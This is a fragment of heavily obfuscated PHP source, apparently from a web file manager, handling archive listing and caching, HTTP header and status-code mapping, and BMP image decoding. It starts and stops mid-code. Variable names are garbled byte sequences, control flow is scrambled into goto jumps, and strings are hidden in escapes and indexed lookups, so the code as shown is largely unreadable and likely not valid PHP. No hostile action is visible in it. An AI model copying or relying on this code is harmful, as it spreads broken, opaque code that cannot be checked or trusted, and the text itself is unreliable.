aò¬˜÷Ìãù: $FÆ°Ãá Úﬂ = 50000; if (request_url_safe($b⁄ÈÁù£Àû)) { $bÜÔçäπùã = parse_url_query($b⁄ÈÁù£Àû); if (!isset($bÜÔçäπùã[$DØàïà¯‰ó[75]])) { show_json($DØàïà¯‰ó[1041], !1); } } $B·∏òó—§Õ = isset($bÜÔçäπùã) ? $bÜÔçäπùã[$DØàïà¯‰ó[75]] : $b⁄ÈÁù£Àû; goto a„ÑÇø¿äÛ; d∂ª©éú‹…: if (isset($bÜÔçäπùã)) { $C±»£üäÕΩ = array($bÜÔçäπùã[$DØàïà¯‰ó[75]], $bÜÔçäπùã[$DØàïà¯‰ó[1040]], $bÜÔçäπùã[$DØàïà¯‰ó[28]]); $f«Î…¢≥ñ¥ = md5(implode($DØàïà¯‰ó[70], $C±»£üäÕΩ)) . $DØàïà¯‰ó[91] . get_path_ext($bÜÔçäπùã[$DØàïà¯‰ó[28]]); } else { $C±»£üäÕΩ = array($bâÎﬂ‰© [$DØàïà¯‰ó[28]], $bâÎﬂ‰© [$DØàïà¯‰ó[75]], $bâÎﬂ‰© [$DØàïà¯‰ó[77]]); $f«Î…¢≥ñ¥ = md5(implode($DØàïà¯‰ó[70], $C±»£üäÕΩ)) . $DØàïà¯‰ó[91] . $E¢Œéè∏ÑÏ; } if ($e¥óîß““Í == -1) { $cÂ¥ ‘óÑÉ = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\x65\167\x2f{$EºﬂÌÃ…à¶}\x2f{$f«Î…¢≥ñ¥}\x2e\154\x6f\x67"; $C‰≤öΩÏıÊ = self::infoFull($cÂ¥ ‘óÑÉ); if ($C‰≤öΩÏıÊ) { $cÂ¥ ‘óÑÉ = $C‰≤öΩÏıÊ[$DØàïà¯‰ó[75]]; $c«ÓÃ√ÙúÎ = self::getContent($cÂ¥ ‘óÑÉ); if ($c«ÓÃ√ÙúÎ) { $eı√õ‡À»ı = json_decode($c«ÓÃ√ÙúÎ, !0); if (count($eı√õ‡À»ı) >= $FÆ°Ãá Úﬂ) { show_json(sprintf(LNG($DØàïà¯‰ó[1042]), count($eı√õ‡À»ı)), !1); } return $eı√õ‡À»ı; } } else { $cÂ¥ ‘óÑÉ = self::mkfile($cÂ¥ ‘óÑÉ); } } $d⁄™˜Û—¯— = TEMP_FILES . $EºﬂÌÃ…à¶; goto D¥Ö˘¥ëÆ∫; B®€—‹ÚÏù: $DØàïà¯‰ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b⁄ÈÁù£Àû = $A–‚æ„Ûãµ[$DØàïà¯‰ó[75]]; $e¥óîß““Í = isset($A–‚æ„Ûãµ[$DØàïà¯‰ó[1040]]) ? $A–‚æ„Ûãµ[$DØàïà¯‰ó[1040]] : -1; goto aò¬˜÷Ìãù; BΩöÒ•¢≠Æ: return $c›™Â¢øÌœ[$DØàïà¯‰ó[1038]]; goto aÙ”Â´è”›; E≤ù⁄âõ: $eı√õ‡À»ı = json_encode($c›™Â¢øÌœ[$DØàïà¯‰ó[1038]]); self::setContent($cÂ¥ ‘óÑÉ, $eı√õ‡À»ı); if (count($c›™Â¢øÌœ[$DØàïà¯‰ó[1038]]) >= $FÆ°Ãá Úﬂ) { show_json(sprintf(LNG($DØàïà¯‰ó[1042]), count($c›™Â¢øÌœ[$DØàïà¯‰ó[1038]])), !1); } goto BΩöÒ•¢≠Æ; a„ÑÇø¿äÛ: $bâÎﬂ‰©  = self::info($B·∏òó—§Õ); $E¢Œéè∏ÑÏ = self::fileExt($bâÎﬂ‰© ); $EºﬂÌÃ…à¶ = self::tmpFileName($bâÎﬂ‰© ); goto d∂ª©éú‹…; dò©ÌÍ¯¶Ò: $E’πææ˘ê® = self::iconvSystem($E’πææ˘ê®); if ($e¥óîß““Í >= 0) { $fŒÓ‰¢“Ë = isset($A–‚æ„Ûãµ[$DØàïà¯‰ó[1044]]) ? $A–‚æ„Ûãµ[$DØàïà¯‰ó[1044]] : !1; $CÇÊÿÖÈßå = isset($A–‚æ„Ûãµ[$DØàïà¯‰ó[28]]) ? $A–‚æ„Ûãµ[$DØàïà¯‰ó[28]] : $DØàïà¯‰ó[33]; KodArchive::filePreview($E’πææ˘ê®, $e¥óîß““Í, $fŒÓ‰¢“Ë, $CÇÊÿÖÈßå); self::archiveExt(); die; } $c›™Â¢øÌœ = KodArchive::listContent($E’πææ˘ê®); goto fïøÏÍã¡ç; aÙ”Â´è”›: } private static function fileExt($F¬ˆìÎÉüÕ) { $féË◊âà«… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f‡Ñ¬–Á«¥ = $F¬ˆìÎÉüÕ[$féË◊âà«…[160]]; if ($f‡Ñ¬–Á«¥ == $féË◊âà«…[1045]) { $dŒäåÆ¢∑Õ = $féË◊âà«…[1046]; if (substr($F¬ˆìÎÉüÕ[$féË◊âà«…[28]], -strlen($dŒäåÆ¢∑Õ)) == $dŒäåÆ¢∑Õ) { $f‡Ñ¬–Á«¥ = $féË◊âà«…[1047]; } } self::archiveExt($f‡Ñ¬–Á«¥); return $f‡Ñ¬–Á«¥; } private static function zipFileList($Cùπ∆≥œå¬, $Cè«ÌëÍ∂ü = false) { $fﬁÀﬂ¿ñ‡´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e–∂õ®ñâø = array(); foreach ($Cùπ∆≥œå¬ as $Däà√ÍÖ∏Ÿ) { $d’≤⁄áÂôì = $Däà√ÍÖ∏Ÿ[$fﬁÀﬂ¿ñ‡´[75]]; if ($Cè«ÌëÍ∂ü) { $d’≤⁄áÂôì = self::copy($Däà√ÍÖ∏Ÿ[$fﬁÀﬂ¿ñ‡´[75]], $Cè«ÌëÍ∂ü, $fﬁÀﬂ¿ñ‡´[753]); } if ($d’≤⁄áÂôì && self::local()->exist($d’≤⁄áÂôì)) { $e–∂õ®ñâø[$Däà√ÍÖ∏Ÿ[$fﬁÀﬂ¿ñ‡´[75]]] = $d’≤⁄áÂôì; } } if (!empty($e–∂õ®ñâø)) { return array_values($e–∂õ®ñâø); } show_json(LNG($fﬁÀﬂ¿ñ‡´[1048]), !1); } public static function tmpFileName($DãÑÈ«™ïâ) { $CÇÀÌóÔ… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dô©äéØ·â = array($DãÑÈ«™ïâ[$CÇÀÌóÔ…[28]], $DãÑÈ«™ïâ[$CÇÀÌóÔ…[75]], $DãÑÈ«™ïâ[$CÇÀÌóÔ…[77]], $DãÑÈ«™ïâ[$CÇÀÌóÔ…[459]]); return md5(implode($CÇÀÌóÔ…[70], $dô©äéØ·â)); } private static function localFilePath($Aµ‘¢∏‘Ñô, $CÒèóﬁ¥Àè) { goto EŒÕÜÏÖäµ; EŒÕÜÏÖäµ: $dº—Ô¡πÓ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($CÒèóﬁ¥Àè == $dº—Ô¡πÓ[1049] && strtoupper(substr(PHP_OS, 0, 3)) == $dº—Ô¡πÓ[1050]) { return !1; } $b¿ûÇ¨Úë∆ = KodIO::parse($Aµ‘¢∏‘Ñô); goto FÚå…òª∆Í; EáÊˆòÖÈÎ: if ($EÇ◊À≤„à£ == $dº—Ô¡πÓ[102] || $EÇ◊À≤„à£ == $dº—Ô¡πÓ[1052]) { if (!$d…Œ—¬©Ÿı->exist($d…Œ—¬©Ÿı->path)) { show_json(LNG($dº—Ô¡πÓ[101]), !1); } return $d…Œ—¬©Ÿı->path; } return !1; goto d∆ã©˜ªÊì; FÚå…òª∆Í: if ($b¿ûÇ¨Úë∆[$dº—Ô¡πÓ[29]] == KodIO::KOD_SOURCE) { $Eà›∆Ìè†Ç = Model($dº—Ô¡πÓ[761])->fileInfoGet(KodIO::sourceID($Aµ‘¢∏‘Ñô)); if (!$Eà›∆Ìè†Ç[$dº—Ô¡πÓ[75]]) { show_json($dº—Ô¡πÓ[1051], !1); } $Aµ‘¢∏‘Ñô = $Eà›∆Ìè†Ç[$dº—Ô¡πÓ[75]]; } $d…Œ—¬©Ÿı = self::init($Aµ‘¢∏‘Ñô); $EÇ◊À≤„à£ = $d…Œ—¬©Ÿı->getType(); goto EáÊˆòÖÈÎ; d∆ã©˜ªÊì: } private static function archiveExt($F‰Á¥ÌŸêì = '') { $GLOBALS[$_SERVER[Ä¿¡‡öóµŸﬂ‡][1053]] = $F‰Á¥ÌŸêì; } } goto EîŒ»ù©¡ú; f∑¿éŒÓÉ⁄: class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\110\124\124\120\137\x48\x4f\x53\124", "\x55\x73\145\x72\x2d\x41\x67\145\x6e\x74" => "\110\x54\124\x50\137\x55\123\105\x52\x5f\101\107\105\x4e\124", "\103\157\156\164\x65\x6e\164\x2d\124\x79\160\145" => "\x48\124\x54\120\137\x43\117\116\x54\105\116\124\x5f\x54\131\x50\105", "\103\157\156\164\x65\x6e\x74\55\x4c\x65\x6e\147\164\x68" => "\x48\124\124\120\x5f\103\117\x4e\124\x45\116\x54\137\x4c\105\116\107\x54\x48", "\104\145\160\164\150" => "\110\x54\124\120\137\x44\105\x50\124\x48", "\105\170\x70\145\143\164" => "\110\x54\x54\x50\137\105\x58\120\x45\x43\124", "\111\146\55\116\157\156\145\55\x4d\141\x74\x63\150" => "\110\x54\124\x50\137\111\106\x5f\116\x4f\x4e\105\x5f\x4d\x41\x54\103\110", "\111\x66\55\115\141\x74\143\x68" => "\x48\x54\124\120\x5f\111\106\x5f\x4d\x41\x54\103\110", "\x49\146\55\122\141\x6e\x67\x65" => "\110\124\x54\x50\x5f\111\106\x5f\122\x41\x4e\107\105", "\x4c\141\163\x74\55\x4d\x6f\144\x69\146\x69\145\x64" => "\x48\124\124\120\x5f\114\x41\x53\x54\137\x4d\117\x44\x49\106\x49\x45\x44", "\x49\146\x2d\115\157\x64\151\146\151\x65\x64\55\x53\x69\x6e\x63\145" => "\x48\124\x54\120\x5f\111\106\137\x4d\x4f\x44\x49\x46\x49\x45\x44\137\123\111\x4e\x43\105", "\111\x66\x2d\125\x6e\155\x6f\x64\151\146\151\x65\144\55\x53\151\156\143\x65" => "\x48\124\x54\x50\137\x49\106\137\125\x4e\x4d\x4f\104\111\106\x49\x45\104\x5f\123\111\116\x43\x45", "\x52\141\156\147\145" => "\x48\x54\124\120\x5f\122\101\116\107\x45", "\124\151\x6d\x65\157\x75\x74" => "\x48\x54\124\120\x5f\124\111\115\105\117\125\x54", "\111\x66" => "\110\x54\x54\x50\137\x49\106", "\114\157\143\x6b\55\124\157\x6b\145\x6e" => "\x48\124\x54\x50\x5f\x4c\117\x43\113\x5f\x54\x4f\113\105\116", "\117\x76\145\x72\x77\162\x69\x74\x65" => "\x48\x54\124\x50\x5f\x4f\x56\105\122\127\122\x49\x54\x45", "\104\x65\x73\164\151\x6e\141\164\151\157\156" => "\110\x54\124\x50\137\x44\105\123\124\x49\x4e\101\x54\111\117\116", "\x52\x65\x71\165\x65\x73\164\x2d\111\x64" => "\122\x45\121\x55\105\x53\124\x5f\111\104", "\x52\145\161\x75\x65\163\x74\55\102\x6f\x64\x79\55\x46\x69\154\x65" => "\x52\105\121\125\105\x53\x54\x5f\102\117\104\131\x5f\106\111\114\x45", "\122\145\x64\x69\162\145\x63\x74\55\x53\164\141\x74\165\x73" => "\x52\x45\104\111\122\x45\103\124\x5f\x53\x54\x41\x54\x55\x53"); public static function init() { static $AŒêÊ´°ûË = false; if ($AŒêÊ´°ûË) { return; } foreach ($_SERVER as $BÓ‹ü∂À◊ => $a∑ìÃÚÃ∞‰) { $BÓ‹ü∂À◊ = strtoupper($BÓ‹ü∂À◊); if (!array_key_exists($BÓ‹ü∂À◊, $_SERVER)) { continue; } $_SERVER[$BÓ‹ü∂À◊] = $a∑ìÃÚÃ∞‰; } foreach (self::$_headers as $BÓ‹ü∂À◊ => $f¡Ç·â≤Öƒ) { if (!array_key_exists($BÓ‹ü∂À◊, $_SERVER)) { continue; } $_SERVER[$BÓ‹ü∂À◊] = $_SERVER[$f¡Ç·â≤Öƒ]; $_SERVER[strtoupper($BÓ‹ü∂À◊)] = $_SERVER[$f¡Ç·â≤Öƒ]; } } public static function get($e¬ì∞”ÒÆ¬) { self::init(); return $_SERVER[$e¬ì∞”ÒÆ¬] ? $_SERVER[$e¬ì∞”ÒÆ¬] : $_SERVER[$_SERVER[Ä¿¡‡öóµŸﬂ‡][1830] . strtoupper($e¬ì∞”ÒÆ¬)]; } public static function method() { return strtoupper(self::get($_SERVER[Ä¿¡‡öóµŸﬂ‡][154])); } public static function length() { $F∂è™√ÂÆï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bﬁΩåæêâè = self::get($F∂è™√ÂÆï[1831]); if (!$bﬁΩåæêâè) { $bﬁΩåæêâè = self::get($F∂è™√ÂÆï[1149]); } return $bﬁΩåæêâè; } public static function range() { $bÑ≥÷„ë›ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F™´å≤¿º‡ = self::get($bÑ≥÷„ë›ı[198]); if (!$F™´å≤¿º‡) { return !1; } if (!preg_match($bÑ≥÷„ë›ı[1832], $F™´å≤¿º‡, $cÁßÃøØºá)) { return !1; } if ($cÁßÃøØºá[1] === $bÑ≥÷„ë›ı[33] && $cÁßÃøØºá[2] === $bÑ≥÷„ë›ı[33]) { return !1; } return array($cÁßÃøØºá[1] !== $bÑ≥÷„ë›ı[33] ? $cÁßÃøØºá[1] : null, $cÁßÃøØºá[2] !== $bÑ≥÷„ë›ı[33] ? $cÁßÃøØºá[2] : null); } public static $statusCode = array("\x31\60\x30" => "\103\157\x6e\164\x69\x6e\165\x65", "\x31\60\x31" => "\x53\x77\151\164\143\x68\x69\156\147\x20\x50\162\157\x74\157\x63\x6f\x6c", "\x31\60\62" => "\x50\162\x6f\x63\x65\x73\x73\x69\156\x67", "\x31\x30\63" => "\105\141\162\x6c\x79\x20\x48\x69\x6e\164\x73", "\62\x30\60" => "\117\113", "\62\x30\61" => "\103\162\145\x61\164\x65\144", "\62\60\62" => "\x41\143\x63\x65\160\x74\145\144", "\x32\60\63" => "\116\x6f\156\x2d\101\x75\x74\150\x6f\162\x69\x74\141\x74\x69\166\145\40\111\156\x66\x6f\162\x6d\x61\164\151\157\x6e", "\x32\60\x34" => "\116\157\x20\x43\157\156\x74\145\156\x74", "\x32\60\65" => "\x52\x65\163\x65\x74\40\x43\157\x6e\164\x65\x6e\x74", "\x32\60\x36" => "\120\141\162\x74\x69\x61\154\40\103\157\x6e\164\x65\x6e\x74", "\62\x30\x37" => "\115\165\x6c\164\x69\55\123\x74\x61\164\165\163", "\63\60\60" => "\x4d\165\154\x74\x69\160\154\x65\40\103\x68\157\151\x63\145\x73", "\63\60\x31" => "\115\x6f\166\x65\x64\40\120\x65\x72\x6d\x61\x6e\x65\x6e\x74\x6c\x79", "\x33\60\x32" => "\106\157\x75\156\x64", "\63\x30\63" => "\123\x65\145\x20\x4f\x74\x68\x65\162", "\63\x30\64" => "\x4e\157\x74\x20\x4d\x6f\144\x69\x66\x69\145\144", "\63\x30\x35" => "\125\163\145\40\x50\162\x6f\170\x79", "\63\60\67" => "\124\x65\155\x70\x6f\162\x61\162\x79\40\122\x65\x64\151\162\145\143\164", "\x33\x30\70" => "\x50\x65\x72\x6d\x61\156\x65\x6e\164\x20\x52\145\x64\x69\162\145\x63\164", "\x34\60\x30" => "\102\141\x64\40\x52\145\161\x75\x65\163\x74", "\64\60\x31" => "\125\156\141\x75\164\150\157\x72\x69\172\145\x64", "\64\60\x32" => "\x50\141\171\155\x65\x6e\164\40\x52\x65\x71\165\151\162\x65\x64", "\64\x30\x33" => "\106\157\x72\x62\x69\144\144\145\x6e", "\64\60\x34" => "\x4e\x6f\x74\40\x46\x6f\165\156\x64", "\64\x30\65" => "\115\x65\164\150\157\x64\x20\116\x6f\164\x20\x41\x6c\x6c\157\x77\x65\144", "\x34\60\66" => "\116\x6f\164\x20\x41\x63\143\145\160\x74\141\142\x6c\x65", "\64\60\67" => "\x50\x72\x6f\170\171\40\x41\x75\x74\150\145\x6e\164\151\143\141\164\x69\x6f\156\40\x52\x65\161\x75\x69\x72\145\144", "\x34\60\70" => "\x52\x65\161\165\145\163\164\40\x54\151\x6d\145\x6f\165\164", "\64\60\x39" => "\103\157\156\146\x6c\x69\x63\x74", "\x34\61\x30" => "\x47\157\x6e\x65", "\x34\x31\61" => "\114\145\x6e\x67\164\150\x20\122\145\161\165\x69\x72\x65\144", "\64\61\x32" => "\x50\162\145\143\x6f\156\144\x69\x74\x69\x6f\x6e\40\106\x61\151\154\145\144", "\64\x31\63" => "\x52\145\x71\x75\145\x73\164\x20\x45\x6e\x74\x69\x74\171\x20\x54\x6f\157\x20\x4c\141\162\147\x65", "\x34\61\64" => "\122\145\x71\165\145\163\x74\x20\125\122\x49\x20\124\157\x6f\x20\114\x61\162\x67\145", "\64\61\65" => "\x55\156\163\x75\160\160\x6f\162\164\145\144\40\x4d\145\144\151\141\40\x54\x79\160\x65", "\64\61\66" => "\122\145\x71\165\145\x73\x74\x65\144\x20\122\x61\x6e\x67\x65\x20\116\x6f\164\40\x53\x61\x74\151\x73\146\151\141\142\154\145", "\x34\61\67" => "\x45\x78\x70\145\x63\164\x61\164\151\x6f\156\40\x46\x61\151\x6c\x65\144", "\64\x32\x32" => "\x55\156\160\x72\x6f\x63\145\163\163\141\x62\x6c\x65\40\x45\x6e\x74\x69\x74\171", "\x34\62\x33" => "\114\x6f\143\x6b\x65\x64", "\x34\62\x34" => "\106\x61\151\154\x65\x64\x20\104\x65\x70\x65\156\144\145\156\143\x79", "\64\62\x35" => "\x55\156\x6f\162\144\x65\162\145\x64\x20\103\x6f\x6c\x6c\145\143\x74\x69\x6f\x6e", "\x34\x32\66" => "\x55\160\147\x72\x61\x64\x65\40\122\145\x71\x75\x69\x72\145\144", "\x34\x32\x38" => "\120\162\x65\x63\x6f\x6e\144\x69\x74\x69\157\x6e\x20\x52\x65\161\165\x69\162\x65\144", "\64\x32\x39" => "\x54\x6f\157\x20\115\141\x6e\171\x20\122\x65\x71\x75\x65\x73\164\x73", "\64\x33\x31" => "\122\145\x71\x75\x65\163\x74\40\110\x65\x61\144\x65\162\x20\106\151\145\x6c\144\163\x20\x54\157\157\x20\114\x61\x72\x67\x65", "\64\64\x34" => "\116\157\x20\x52\x65\163\160\157\x6e\163\145", "\x34\65\60" => "\x42\154\x6f\x63\153\145\144\x20\142\171\40\127\x69\x6e\x64\x6f\x77\x73\x20\x50\x61\162\x65\156\x74\x61\154\x20\103\157\156\164\x72\157\154\163", "\x34\x35\61" => "\125\x6e\141\x76\141\151\154\x61\x62\x6c\145\40\x46\x6f\x72\x20\114\145\147\x61\154\40\x52\x65\141\x73\x6f\x6e\163", "\64\x39\x34" => "\x52\145\161\x75\x65\163\x74\x20\x48\x65\x61\144\x65\x72\40\124\x6f\157\40\114\141\162\147\x65", "\65\x30\x30" => "\111\x6e\164\x65\x72\x6e\141\x6c\40\123\145\162\166\x65\162\x20\x45\162\x72\x6f\162", "\65\x30\61" => "\116\x6f\164\x20\x49\155\160\x6c\145\155\x65\156\x74\x65\x64", "\x35\60\x32" => "\x42\141\144\40\107\x61\164\x65\167\141\x79", "\65\x30\63" => "\123\x65\162\x76\x69\x63\145\x20\125\156\141\166\141\x69\x6c\x61\142\x6c\x65", "\x35\x30\x34" => "\x47\x61\164\x65\x77\141\x79\x20\x54\x69\155\x65\157\165\x74", "\65\60\65" => "\110\x54\x54\x50\x20\126\x65\x72\163\151\x6f\156\40\156\x6f\x74\x20\163\165\160\x70\x6f\162\x74\x65\144", "\x35\x30\x37" => "\x49\x6e\x73\165\x66\x66\x69\143\151\x65\x6e\164\x20\x53\164\157\162\141\x67\145"); public static function code($a∑ËÇ∑®¶–) { $aâüıÎÀÃô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a∑ËÇ∑®¶– = $a∑ËÇ∑®¶– . $aâüıÎÀÃô[33]; $aÿíü÷‘›ã = self::$statusCode[$a∑ËÇ∑®¶–]; $aÿíü÷‘›ã = $aÿíü÷‘›ã ? "\x48\x54\124\x50\x2f\x31\56\61\x20{$a∑ËÇ∑®¶–}\40" . $aÿíü÷‘›ã : $aâüıÎÀÃô[33]; return $aÿíü÷‘›ã; } } class ImageGdBMP { public static function load($FôÑ”¶«åÆ) { $Cïûß…≠û¢ = fopen($FôÑ”¶«åÆ, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1522]); if ($Cïûß…≠û¢ === !1) { return !1; } $eÔπÈË€†© = self::loadFromStream($Cïûß…≠û¢); fclose($Cïûß…≠û¢); return $eÔπÈË€†©; } public static function loadFromStream($cÏÑ·öïÎã) { $DÒ˜œÛª¯Ë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eá¢óñç∂Ó = fread($cÏÑ·öïÎã, 14); if ($eá¢óñç∂Ó === !1) { return !1; } if ($eá¢óñç∂Ó[0] != $DÒ˜œÛª¯Ë[1833] || $eá¢óñç∂Ó[1] != $DÒ˜œÛª¯Ë[1834]) { return !1; } $dÍßÚËÃÍà = unpack($DÒ˜œÛª¯Ë[1835] . $DÒ˜œÛª¯Ë[1836] . $DÒ˜œÛª¯Ë[1837] . $DÒ˜œÛª¯Ë[1838] . $DÒ˜œÛª¯Ë[1839], $eá¢óñç∂Ó); return self::loadFromStreamAndFileHeader($cÏÑ·öïÎã, $dÍßÚËÃÍà); } public static function loadFromStreamAndFileHeader($E≥ÚàÓç◊§, array $b±´’≤÷èﬂ) { goto Aπ°“ô¡—á; bÖÖƒ¿„äì: $F«Éî¥¿íé = abs($B≤¬…ı⁄Ì—); $AÑÉ„ˆ»Úé = $B≤¬…ı⁄Ì— > 0 ? $F«Éî¥¿íé - 1 : 0; $A“∂ô·âå§ = $B≤¬…ı⁄Ì— > 0 ? -1 : 1; goto B®äÙ∞·ã≤; Fÿ’ÍöÕäü: if ($A”ôÌ∏ == 0 || $B≤¬…ı⁄Ì— == 0 || $e⁄ıÏØ·”Û != 1 || ($c√÷Á÷ÓáÌ & $b…£•ë∞Ãø) != 0 || ($c√÷Á÷ÓáÌ & $f»—ı” ü÷) != 0 || ($c√÷Á÷ÓáÌ & $A€Âæô∑ˆå) != 0 || ($b…£•ë∞Ãø & $f»—ı” ü÷) != 0 || ($b…£•ë∞Ãø & $A€Âæô∑ˆå) != 0 || ($f»—ı” ü÷ & $A€Âæô∑ˆå) != 0) { return !1; } if ($c†ãà¡∂¥≠ == 4 || $c†ãà¡∂¥≠ == 5) { $fØÀèå„åë = stream_get_contents($E≥ÚàÓç◊§, $f§ÉÖ¨∂°É); if ($fØÀèå„åë === !1) { return !1; } return imagecreatefromstring($fØÀèå„åë); } $C–°ÁØŒòË = $A”ôÌ∏ * $B¶ø†±ƒäï + 31 >> 3 & ~3; goto bÖÖƒ¿„äì; Aπ°“ô¡—á: $F“¡Ü¿µË˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($b±´’≤÷èﬂ[$F“¡Ü¿µË˜[388]] != 19778) { return !1; } $fØÀèå„åë = fread($E≥ÚàÓç◊§, 4); goto F± ﬂåüä∫; F± ﬂåüä∫: if ($fØÀèå„åë === !1) { return !1; } list(, $aîÏ£°Ü‘µ) = unpack($F“¡Ü¿µË˜[1840], $fØÀèå„åë); if ($aîÏ£°Ü‘µ == 12) { goto Fè∆ÉãÍ±û; Fè∆ÉãÍ±û: $fØÀèå„åë = fread($E≥ÚàÓç◊§, $aîÏ£°Ü‘µ - 4); if ($fØÀèå„åë === !1) { return !1; } extract(unpack($F“¡Ü¿µË˜[1841] . $F“¡Ü¿µË˜[1842] . $F“¡Ü¿µË˜[1843] . $F“¡Ü¿µË˜[1844], $fØÀèå„åë)); goto bë¨À¡º„’; f◊Ø…ÿêœï: $A€Âæô∑ˆå = 255; goto D∑ëæ°àÇ…; bë¨À¡º„’: $A√¶ÀÖŸ™© = $fö°à¯«ßı = $c√÷Á÷ÓáÌ = $c†ãà¡∂¥≠ = 0; $b…£•ë∞Ãø = 16711680; $f»—ı” ü÷ = 65280; goto f◊Ø…ÿêœï; D∑ëæ°àÇ…: } else { if (124 < $aîÏ£°Ü‘µ || $aîÏ£°Ü‘µ < 40) { return !1; } else { goto AÍì…‚”°â; aÀ–íƒ˘µË: if ($A”ôÌ∏ & 2147483648) { $A”ôÌ∏ = -(~$A”ôÌ∏ & 4294967295) - 1; } if ($B≤¬…ı⁄Ì— & 2147483648) { $B≤¬…ı⁄Ì— = -(~$B≤¬…ı⁄Ì— & 4294967295) - 1; } if ($BÑõΩ±√Í‹ & 2147483648) { $BÑõΩ±√Í‹ = -(~$BÑõΩ±√Í‹ & 4294967295) - 1; } goto B£Î„Ç£ˆª; AÍì…‚”°â: $fØÀèå„åë = fread($E≥ÚàÓç◊§, 36); if ($fØÀèå„åë === !1) { return !1; } extract(unpack($F“¡Ü¿µË˜[1845] . $F“¡Ü¿µË˜[1846] . $F“¡Ü¿µË˜[1843] . $F“¡Ü¿µË˜[1847] . $F“¡Ü¿µË˜[1848] . $F“¡Ü¿µË˜[1849] . $F“¡Ü¿µË˜[1850] . $F“¡Ü¿µË˜[1851] . $F“¡Ü¿µË˜[1852] . $F“¡Ü¿µË˜[1853], $fØÀèå„åë)); goto aÀ–íƒ˘µË; CÕâË≠πÎŒ: if (($B¶ø†±ƒäï == 16 || $B¶ø†±ƒäï == 24 || $B¶ø†±ƒäï == 32) && $c†ãà¡∂¥≠ == 0 && $b…£•ë∞Ãø == 0 && $f»—ı” ü÷ == 0 && $A€Âæô∑ˆå == 0) { switch ($B¶ø†±ƒäï) { case 16: $b…£•ë∞Ãø = 31744; $f»—ı” ü÷ = 992; $A€Âæô∑ˆå = 31; break; case 24: case 32: $b…£•ë∞Ãø = 16711680; $f»—ı” ü÷ = 65280; $A€Âæô∑ˆå = 255; break; } } goto dú°ËÓﬁêà; B£Î„Ç£ˆª: if ($f…íãâÑπ‰ & 2147483648) { $f…íãâÑπ‰ = -(~$f…íãâÑπ‰ & 4294967295) - 1; } if ($b±´’≤÷èﬂ[$F“¡Ü¿µË˜[520]] != 0) { $C»»‘õèáÛ = $B¶ø†±ƒäï == 1 || $B¶ø†±ƒäï == 4 || $B¶ø†±ƒäï == 8 ? ($A√¶ÀÖŸ™© ? $A√¶ÀÖŸ™© : pow(2, $B¶ø†±ƒäï)) << 2 : 0; $eôÒœÑë¢√ = $f§ÉÖ¨∂°É ? $f§ÉÖ¨∂°É : ($A”ôÌ∏ * $B¶ø†±ƒäï + 31 >> 3 & ~3) * abs($B≤¬…ı⁄Ì—); $A¬§¨øØôù = $b±´’≤÷èﬂ[$F“¡Ü¿µË˜[520]] - $eôÒœÑë¢√ - $C»»‘õèáÛ - 14; if ($aîÏ£°Ü‘µ < $A¬§¨øØôù && 40 <= $aîÏ£°Ü‘µ && $aîÏ£°Ü‘µ <= 124) { $aîÏ£°Ü‘µ = $A¬§¨øØôù; } } if ($aîÏ£°Ü‘µ - 40 > 0) { $fØÀèå„åë = fread($E≥ÚàÓç◊§, $aîÏ£°Ü‘µ - 40); if ($fØÀèå„åë === !1) { return !1; } extract(unpack($F“¡Ü¿µË˜[1854] . $F“¡Ü¿µË˜[1855] . $F“¡Ü¿µË˜[1856] . $F“¡Ü¿µË˜[1857], $fØÀèå„åë . str_repeat($F“¡Ü¿µË˜[1858], 120))); } else { $c√÷Á÷ÓáÌ = $b…£•ë∞Ãø = $f»—ı” ü÷ = $A€Âæô∑ˆå = 0; } goto CÕâË≠πÎŒ; dú°ËÓﬁêà: } } goto Fÿ’ÍöÕäü; B®äÙ∞·ã≤: if ($B¶ø†±ƒäï == 1 || $B¶ø†±ƒäï == 4 || $B¶ø†±ƒäï == 8) { goto CÈ‡¥Áà¬; C‘Ùà‚Ωéà: $fé˘≤—äù‚ = (1 << $B¶ø†±ƒäï) - 1 << $B¶”¬ì”úá; if ($c†ãà¡∂¥≠ == 1 || $c†ãà¡∂¥≠ == 2) { $CÃÚ»Ú››∏ = 0; $FàªàÃÆ¨ñ = $B¶ø†±ƒäï >> 2 & 1; for (;;) { if ($CÃÚ»Ú››∏ < -1 || $CÃÚ»Ú››∏ > $A”ôÌ∏ || $AÑÉ„ˆ»Úé < -1 || $AÑÉ„ˆ»Úé > $B≤¬…ı⁄Ì—) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } $fØÀèå„åë = fread($E≥ÚàÓç◊§, 1); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } switch ($fØÀèå„åë) { case $F“¡Ü¿µË˜[1858]: $fØÀèå„åë = fread($E≥ÚàÓç◊§, 1); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } switch ($fØÀèå„åë) { case $F“¡Ü¿µË˜[1858]: $AÑÉ„ˆ»Úé += $A“∂ô·âå§; $CÃÚ»Ú››∏ = 0; break; case $F“¡Ü¿µË˜[1860]: $AÑÉ„ˆ»Úé = 0; $CÃÚ»Ú››∏ = 0; break 3; case $F“¡Ü¿µË˜[1861]: $fØÀèå„åë = fread($E≥ÚàÓç◊§, 2); if ($fØÀèå„åë === !1) { imagedestroy($AìƒÚõÙ¯Ÿ); return !1; } list(, $dÃ¥•Ÿ™ÒÎ, $E¢ïƒåùæù) = unpack($F“¡Ü¿µË˜[1862], $fØÀèå„åë); $CÃÚ»Ú››∏ += $dÃ¥•Ÿ™ÒÎ; $AÑÉ„ˆ»Úé += $E¢ïƒåùæù * $A“∂ô·âå§; break; default: list(, $e±É±—©ìò) = unpack($F“¡Ü¿µË˜[1863], $fØÀèå„åë); $D˘≤ÀÙÛÃÛ = ($e±É±—©ìò >> $FàªàÃÆ¨ñ) + 